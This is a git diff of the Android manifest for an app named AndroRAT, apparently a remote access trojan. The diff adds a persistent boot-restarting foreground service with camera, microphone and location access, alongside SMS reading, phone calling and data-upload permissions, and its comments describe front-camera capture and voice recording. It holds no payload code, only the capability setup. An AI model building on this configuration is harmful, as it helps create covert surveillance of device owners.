@@ -2,14 +2,45 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- To upload data-->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!--    SMS READING-->
-    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- For endless service-->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
-    <!--RECORD AUDIO-->
+    <!-- For trigger service on low battery time-->
+    <uses-permission android:name="android.permission.WAKE_LOCK" tools:node="replace"/>
+
+    <!-- For restarting service after the device is rebooted-->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- To get location-->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- To take picture with front camera-->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.camera.front"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.camera.autofocus"
+        android:required="false" />
+
+    <!-- To record voice -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
+    <!-- TODO - OTHER PERMISSION  OPTIMIZE LATER-->
+
+    <!-- SMS READING-->
+    <uses-permission android:name="android.permission.READ_SMS" />
 
     <!-- CALL PHONE-->
     <uses-feature
@@ -17,18 +48,12 @@
         android:required="false" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
 
-    <!--CAMERA -->
-    <uses-feature
-        android:name="android.hardware.camera"
-        android:required="false" />
-    <uses-permission android:name="android.permission.CAMERA" />
-
     <!--    Permission for files varies according to device's sdk version-->
     <!--    For Android 6.0 (sdk 23) "<=" up to "<" Android 10 (sdk 29)-->
     <uses-permission-sdk-23
         android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="28" />
-    <!--    todo campare with vid compose-->
+    <!--    todo compare with vid compose-->
     <uses-permission-sdk-23
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="28" />
@@ -56,6 +81,7 @@
     <!--android:requestLegacyExternalStorage="true"-->
 
     <application
+        android:name=".core.app.AndroRatApp"
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
@@ -68,7 +94,7 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
-            android:name=".screens.MainActivity"
+            android:name=".features.MainActivity"
             android:exported="true"
             android:theme="@style/Theme.AndroRAT">
             <intent-filter>
@@ -77,6 +103,23 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <service
+            android:name=".core.services.endless_service.EndlessService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="camera|microphone|location"
+            android:stopWithTask="false" />
+
+        <receiver
+            android:name=".core.services.endless_service.StartReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
     </application>
 
 </manifest>
